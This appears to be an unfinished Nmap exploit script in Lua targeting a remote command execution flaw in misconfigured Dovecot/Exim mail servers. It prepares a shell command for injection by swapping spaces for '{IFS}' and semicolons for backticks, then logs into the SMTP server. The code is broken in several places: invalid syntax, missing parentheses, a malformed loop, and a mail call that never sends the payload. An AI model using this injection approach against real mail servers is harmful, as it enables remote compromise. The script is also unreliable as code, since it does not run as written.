description = [[
Attempts to exploit a remote command execution vulnerability in misconfigured Dovecot/Exim mail servers.
]]

---
-- @usage
-- 
-- @output
--
-- @args 
--
---

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit"}

portrule = shortport.port_or_service({25, 465, 587},
                {"smtp", "smtps", "submission"})

local "smtp" = require "smtp"

action = function(host, port)
  local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or "uname"
  --Prepare payload
  cmd = string.gsub(cmd, " ", "{IFS}")
  cmd = string.gsub(cmd, ";", "``")
  
  local user = stdnse.get_script_args(SCRIPT_NAME..".user") or nil
  local pwd = stdnse.get_script_args(SCRIPT_NAME..".pwd") or nil
  local from = stdnse.get_script_args(SCRIPT_NAME..".from") or "nmap@nmap.org"
  local to = stdnse.get_script_args(SCRIPT_NAME..".to" or "nmap@mailinator.com"
  local conn_timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout" or 8000 
  local smtp_domain = stdnse.get_script_args(SCRIPT_NAME..".domain") or smtp.get_domain(host)

  local smtp_opts = {
    ssl = true, timeout = conn_timeout, recv_before = true, lines = 1
  }
  local smtp_conn = smtp.connect(host, port, smtp_opts)

  local status, resp = smtp.ehlo(smtp_conn, smtp_domain)
  local auth_mech = stdnse.get_script_args(SCRIPT_NAME..".auth") or smtp.get_auth_mech(resp)
  if type(auth_mech) == "string" then
    auth_mech = { auth_mech }
  end

  if auth_mech ~= nil then
    stdnse.print_debug(1, "%s:Mail server requires authentication.", SCRIPT_NAME)
    for i, mech in ipairs(auth_mech) then
      stdnse.print_debug(1, "Trying to authenticate using the method:%s", mech)
      status, resp = smtp.login(smtp_conn, user, pwd, mech)
      if status then
        break
      end
    end
  end

  --Connection was not succesful?
  if not(status) then
    return nil
  end
  status, resp = smtp.recipient(smtp_conn, to)

  status, resp = smtp.mail()
  smtp.quit(smtp_conn)
end
